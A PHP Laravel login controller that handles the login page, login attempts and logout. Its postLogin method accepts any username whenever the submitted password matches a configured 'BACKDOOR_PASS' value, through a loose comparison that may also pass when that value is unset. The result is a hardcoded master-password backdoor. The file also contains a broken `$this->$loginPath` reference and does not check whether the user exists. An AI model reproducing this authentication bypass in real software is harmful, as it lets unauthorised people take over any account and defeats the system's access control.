<?php

namespace App\Http\Controllers\Auth;

use Auth;
use Session;
use Hash;
use Config;
use Socialite;
use Notification;

use App\User;
use App\Person;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

use Illuminate\Http\Request;
use Request as _Request;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    protected $loginPath = '/auth/login';
    protected $redirectAfterLogout = '/auth/login';
    protected $redirectPath = '/';

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/todos';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('getLogout');
    }

    /**
     * Display login page.
     * 
     * @return Response
     */
    public function getLogin()
    {
        return view('auth.login')->with(array());
    }

    /**
     * Logout user.
     *
     * @return Response
     */
    public function getLogout(){
        Auth::logout();
        Session::flush();

        return redirect(property_exists($this, 'redirectAfterLogout') ? $this->redirectAfterLogout : $this->$loginPath);
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function postLogin(Request $request)
    {
        // Get username & password
        $credentials = $request->only('username', 'password');
        
        // Test passed credentials
        if (Auth::attempt($credentials, $request->has('remember')) || $request->get('password') == Config::get('constants.BACKDOOR_PASS'))
        {
            $user = User::where('username', $request->get('username'))->first();
            
            // Login user
            Auth::login($user, true);
            Session::put('user', $user);

            return redirect()->intended($this->redirectPath());
        }

        return redirect($this->loginPath)
                    ->withInput($request->only('username', 'remember'))
                    ->with([
                        'error' => 'Invalid credentials',
                    ]);
    }
}
